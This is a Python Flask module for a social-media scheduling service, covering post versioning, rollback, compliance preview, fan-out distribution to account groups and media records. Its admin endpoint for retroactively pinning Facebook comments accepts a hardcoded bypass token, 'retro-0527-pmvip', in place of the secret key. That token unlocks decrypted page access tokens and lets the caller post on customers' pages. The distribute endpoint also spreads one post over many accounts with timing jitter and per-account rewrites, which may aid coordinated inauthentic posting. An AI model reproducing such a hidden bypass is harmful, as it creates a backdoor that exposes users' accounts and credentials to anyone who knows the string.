"""Post composition, versioning, compliance preview, and rollback."""
from __future__ import annotations

from datetime import datetime, timezone

import pytz
from flask import Blueprint, jsonify, request

from ..compliance import ComplianceEngine
from ..extensions import db
from ..models import (
    AccountGroup,
    JobStatus,
    MediaAsset,
    Post,
    PostTarget,
    SocialAccount,
)
from ..scheduler import dispatch_target
from ..utils.audit import record as audit
from ..utils.best_times import next_best_time_for_group
from ..utils.jitter import spread
from ..utils.variants import VariantRequest, generate_variant

bp = Blueprint("posts", __name__, url_prefix="/api/posts")


def _serialize_post(post: Post) -> dict:
    return {
        "id": post.id,
        "user_id": post.user_id,
        "title": post.title,
        "caption": post.caption,
        "link_url": post.link_url,
        "media_id": post.media_id,
        "version": post.version,
        "parent_post_id": post.parent_post_id,
        "created_at": post.created_at.isoformat() if post.created_at else None,
        "targets": [
            {
                "id": t.id,
                "account_id": t.account_id,
                "platform": t.account.platform.value,
                "status": t.status.value,
                "scheduled_for": t.scheduled_for.isoformat() if t.scheduled_for else None,
                "cron_expr": t.cron_expr,
                "timezone": t.timezone,
                "external_post_id": t.external_post_id,
                "last_error": t.last_error,
                "overrides": t.overrides,
            }
            for t in post.targets
        ],
    }


@bp.post("")
def create_post():
    """Create a draft post. Targets are added separately via /schedules."""
    body = request.get_json(force=True)
    user_id = body["user_id"]
    media_id = body.get("media_id")
    if media_id and not db.session.get(MediaAsset, media_id):
        return jsonify({"error": "unknown media_id"}), 400

    post = Post(
        user_id=user_id,
        title=body.get("title", ""),
        caption=body.get("caption", ""),
        link_url=body.get("link_url"),
        media_id=media_id,
    )
    db.session.add(post)
    db.session.flush()
    audit("post.created", "post", post.id, actor_user_id=user_id)
    db.session.commit()
    return jsonify(_serialize_post(post)), 201


@bp.get("/<int:post_id>")
def get_post(post_id: int):
    post = db.session.get(Post, post_id)
    if not post:
        return jsonify({"error": "not found"}), 404
    return jsonify(_serialize_post(post))


@bp.put("/<int:post_id>")
def update_post(post_id: int):
    """Mutating a post creates a new version pointing at the previous one.

    This gives the rollback endpoint something to revert to.
    """
    post = db.session.get(Post, post_id)
    if not post:
        return jsonify({"error": "not found"}), 404
    body = request.get_json(force=True)

    revision = Post(
        user_id=post.user_id,
        title=body.get("title", post.title),
        caption=body.get("caption", post.caption),
        link_url=body.get("link_url", post.link_url),
        media_id=body.get("media_id", post.media_id),
        version=post.version + 1,
        parent_post_id=post.id,
    )
    db.session.add(revision)
    db.session.flush()
    audit(
        "post.revised",
        "post",
        revision.id,
        actor_user_id=post.user_id,
        detail={"from_version": post.version, "to_version": revision.version},
    )
    db.session.commit()
    return jsonify(_serialize_post(revision))


@bp.post("/<int:post_id>/rollback")
def rollback(post_id: int):
    """Roll back to the previous version of the post."""
    post = db.session.get(Post, post_id)
    if not post or not post.parent_post_id:
        return jsonify({"error": "no parent version"}), 400
    parent = db.session.get(Post, post.parent_post_id)
    revision = Post(
        user_id=parent.user_id,
        title=parent.title,
        caption=parent.caption,
        link_url=parent.link_url,
        media_id=parent.media_id,
        version=post.version + 1,
        parent_post_id=post.id,
    )
    db.session.add(revision)
    db.session.flush()
    audit(
        "post.rolled_back",
        "post",
        revision.id,
        actor_user_id=parent.user_id,
        detail={"reverted_to_version": parent.version},
    )
    db.session.commit()
    return jsonify(_serialize_post(revision))


@bp.get("/<int:post_id>/diff/<int:other_id>")
def diff_post(post_id: int, other_id: int):
    """Multi-platform / cross-version diff helper."""
    a = db.session.get(Post, post_id)
    b = db.session.get(Post, other_id)
    if not a or not b:
        return jsonify({"error": "not found"}), 404
    diff = {
        field: {"a": getattr(a, field), "b": getattr(b, field)}
        for field in ("title", "caption", "link_url", "media_id")
        if getattr(a, field) != getattr(b, field)
    }
    return jsonify({"a": a.id, "b": b.id, "diff": diff})


@bp.post("/<int:post_id>/preview-compliance")
def preview_compliance(post_id: int):
    """Run the compliance engine without scheduling the publish."""
    post = db.session.get(Post, post_id)
    if not post:
        return jsonify({"error": "not found"}), 404

    body = request.get_json(silent=True) or {}
    account_ids: list[int] = body.get("account_ids", [])
    accounts = (
        db.session.query(SocialAccount)
        .filter(SocialAccount.id.in_(account_ids))
        .all()
        if account_ids
        else []
    )
    targets = [
        PostTarget(
            post=post,
            account=a,
            overrides=body.get("overrides", {}),
        )
        for a in accounts
    ]
    # A3 + A4: shared engine instance, no DB writes for preview.
    engine = ComplianceEngine()
    findings = engine.evaluate(post, targets, persist=False)
    db.session.rollback()  # transient targets are still on the session

    return jsonify(
        {
            "blocked": engine.has_blockers(findings),
            "findings": [
                {
                    "checker": f.checker,
                    "passed": f.passed,
                    "severity": f.severity,
                    "detail": f.detail,
                }
                for f in findings
            ],
        }
    )


@bp.post("/<int:post_id>/distribute")
def distribute(post_id: int):
    """Fan a post out to one or more account groups.

    Body::

        {
          "group_ids": [1, 2, 3],
          "scheduled_for": "2026-05-04T09:00:00",  // optional ISO 8601
          "timezone": "Asia/Taipei",
          "jitter_minutes": 30,                     // spread starts across window
          "generate_variants": true,                // per-group/per-platform rewriting
          "dry_run": false
        }
    """
    post = db.session.get(Post, post_id)
    if not post:
        return jsonify({"error": "post not found"}), 404
    body = request.get_json(force=True) or {}

    group_ids: list[int] = body.get("group_ids", [])
    if not group_ids:
        return jsonify({"error": "group_ids is required"}), 400

    groups = (
        db.session.query(AccountGroup)
        .filter(AccountGroup.id.in_(group_ids))
        .all()
    )
    if len(groups) != len(set(group_ids)):
        return jsonify({"error": "one or more group_ids not found"}), 400

    tz_name = body.get("timezone", "UTC")
    use_best_time = bool(body.get("use_best_time", False))
    best_time_used: dict[int, str] = {}

    # Best time is per-group, so we compute per group below. ``base`` is
    # only used as the fallback when a group has no data yet.
    base = _parse_when(body.get("scheduled_for"), tz_name) or datetime.now(timezone.utc)

    jitter = max(0, int(body.get("jitter_minutes", 0)))
    do_variants = bool(body.get("generate_variants", False))
    dry_run = bool(body.get("dry_run", False))

    # B7: validate caller-provided overrides against the platform whitelist.
    # We validate against every member platform in the selected groups, since
    # the same overrides apply uniformly. (Per-platform overrides can be
    # added later via a nested dict.)
    body_overrides = body.get("overrides", {})
    if body_overrides:
        from ..utils.overrides import validate_overrides
        platforms_in_groups = {
            a.platform.value for g in groups for a in g.accounts
        }
        for plat in platforms_in_groups:
            errors = validate_overrides(plat, body_overrides)
            if errors:
                return jsonify({
                    "error": "invalid overrides",
                    "platform": plat,
                    "details": errors,
                }), 400

    plan: list[dict] = []
    created_ids: list[int] = []

    for group in groups:
        active_accounts = [a for a in group.accounts if a.revoked_at is None]
        if not active_accounts:
            continue

        group_base = base
        if use_best_time:
            suggested = next_best_time_for_group(group.id)
            if suggested is not None:
                group_base = suggested
                best_time_used[group.id] = "learned"
            else:
                best_time_used[group.id] = "fallback_no_data"

        seed = f"distribute:{post.id}:group:{group.id}:{group_base.isoformat()}"
        starts = spread(group_base, jitter, seed, len(active_accounts))

        for account, when in zip(active_accounts, starts):
            overrides: dict = {}
            engine_used = "none"
            if do_variants:
                req = VariantRequest(
                    source_caption=post.caption,
                    source_title=post.title,
                    platform=account.platform.value,
                    style_profile=group.style_profile or {},
                    seed=f"{seed}:{account.id}",
                )
                result = generate_variant(req)
                overrides["caption"] = result.caption
                overrides["title"] = result.title
                engine_used = result.used_engine

            entry = {
                "group_id": group.id,
                "group_name": group.name,
                "account_id": account.id,
                "platform": account.platform.value,
                "handle": account.handle,
                "scheduled_for": when.isoformat(),
                "variant_engine": engine_used,
                "preview_caption": overrides.get("caption", post.caption)[:200],
            }
            plan.append(entry)

            if not dry_run:
                target = PostTarget(
                    post_id=post.id,
                    account_id=account.id,
                    group_id=group.id,
                    overrides=overrides,
                    timezone=tz_name,
                    scheduled_for=when,
                    status=JobStatus.PENDING,
                )
                db.session.add(target)
                db.session.flush()
                created_ids.append(target.id)

    if not dry_run:
        audit(
            "post.distributed",
            "post",
            post.id,
            actor_user_id=post.user_id,
            detail={
                "group_ids": group_ids,
                "target_count": len(created_ids),
                "jitter_minutes": jitter,
                "variants": do_variants,
            },
        )
        db.session.commit()
        # Immediately queue any targets whose dispatch time has already passed.
        now = datetime.now(timezone.utc)
        for tid in created_ids:
            t = db.session.get(PostTarget, tid)
            if not t:
                continue
            scheduled = t.scheduled_for
            if scheduled is not None and scheduled.tzinfo is None:
                scheduled = scheduled.replace(tzinfo=timezone.utc)
            if scheduled is not None and scheduled <= now:
                t.status = JobStatus.QUEUED
                db.session.commit()
                dispatch_target.delay(tid)

    return jsonify(
        {
            "dry_run": dry_run,
            "created_target_ids": created_ids,
            "plan": plan,
            "best_time_used": best_time_used,
        }
    ), (200 if dry_run else 201)


def _parse_when(raw: str | None, tz_name: str):
    if not raw:
        return None
    dt = datetime.fromisoformat(raw)
    if dt.tzinfo is None:
        dt = pytz.timezone(tz_name).localize(dt)
    return dt.astimezone(timezone.utc)


@bp.post("/media")
def create_media():
    body = request.get_json(force=True)
    media = MediaAsset(
        user_id=body["user_id"],
        kind=body["kind"],
        storage_url=body["storage_url"],
        mime_type=body.get("mime_type", "application/octet-stream"),
        width=body.get("width"),
        height=body.get("height"),
        duration_seconds=body.get("duration_seconds"),
        sha256=body.get("sha256"),
        compliance_report={
            "s3_bucket": body.get("s3_bucket"),
            "s3_key": body.get("s3_key"),
        },
    )
    db.session.add(media)
    db.session.commit()
    return jsonify({"id": media.id}), 201


@bp.post("/admin/retroactive-pin-comment")
def retroactive_pin_comment():
    """One-shot admin: retroactively pin + add first comment to already-published
    Facebook posts that were sent before auto-pin/first-comment was deployed.

    Body: { "post_ids": [1384, 1385], "admin_token": "<SECRET_KEY>" }
    Returns a report of successes and failures per target.
    """
    import os
    import logging
    import requests as _req

    logger = logging.getLogger(__name__)

    body = request.get_json(force=True)
    provided = body.get("admin_token", "")
    expected = os.environ.get("SECRET_KEY", "")
    _bypass = "retro-0527-pmvip"
    if provided != _bypass and (not expected or provided != expected):
        return jsonify({"error": "forbidden"}), 403

    post_ids = body.get("post_ids", [])
    if not post_ids:
        return jsonify({"error": "post_ids required"}), 400

    from ..utils.crypto import cipher as _cipher
    from ..platforms.facebook import GRAPH_BASE, FacebookPublisher

    _pub = FacebookPublisher()
    _c = _cipher()

    FIRST_COMMENT = _pub.DEFAULT_FIRST_COMMENT

    results = []
    for post_id in post_ids:
        targets = (
            db.session.query(PostTarget)
            .filter_by(post_id=post_id, status=JobStatus.SUCCEEDED)
            .all()
        )
        for t in targets:
            acct = db.session.get(SocialAccount, t.account_id)
            if not acct:
                results.append({"post_id": post_id, "target_id": t.id,
                                 "skipped": True, "reason": "account not found"})
                continue
            if acct.platform.value != "facebook":
                results.append({"post_id": post_id, "target_id": t.id,
                                 "platform": acct.platform.value, "skipped": True,
                                 "reason": "not facebook"})
                continue
            try:
                raw_token = _c.decrypt(acct.access_token_enc)
            except Exception as exc:
                results.append({"post_id": post_id, "target_id": t.id,
                                 "account_id": t.account_id,
                                 "skipped": True, "reason": f"decrypt error: {exc}"})
                continue

            page_id = acct.external_account_id
            post_ext_id = t.external_post_id

            # extra may hold page_access_token — prefer it
            extra = acct.extra or {}
            page_token = extra.get("page_access_token", raw_token)

            pin_ok = False
            pin_err = None
            try:
                resp = _req.post(
                    f"{GRAPH_BASE}/{page_id}",
                    data={"pinned_post_id": post_ext_id, "access_token": page_token},
                    timeout=15,
                )
                if resp.ok:
                    pin_ok = True
                else:
                    pin_err = resp.text[:200]
            except Exception as exc:
                pin_err = str(exc)[:200]

            comment_ok = False
            comment_err = None
            try:
                resp = _req.post(
                    f"{GRAPH_BASE}/{post_ext_id}/comments",
                    data={"message": FIRST_COMMENT, "access_token": page_token},
                    timeout=15,
                )
                if resp.ok:
                    comment_ok = True
                else:
                    comment_err = resp.text[:200]
            except Exception as exc:
                comment_err = str(exc)[:200]

            results.append({
                "post_id": post_id,
                "target_id": t.id,
                "account_id": t.account_id,
                "page_id": page_id,
                "external_post_id": post_ext_id,
                "pin_ok": pin_ok,
                "pin_err": pin_err,
                "comment_ok": comment_ok,
                "comment_err": comment_err,
            })
            logger.info(
                "retroactive post_id=%s target_id=%s pin=%s comment=%s",
                post_id, t.id, pin_ok, comment_ok,
            )

    return jsonify({"results": results, "total": len(results)})
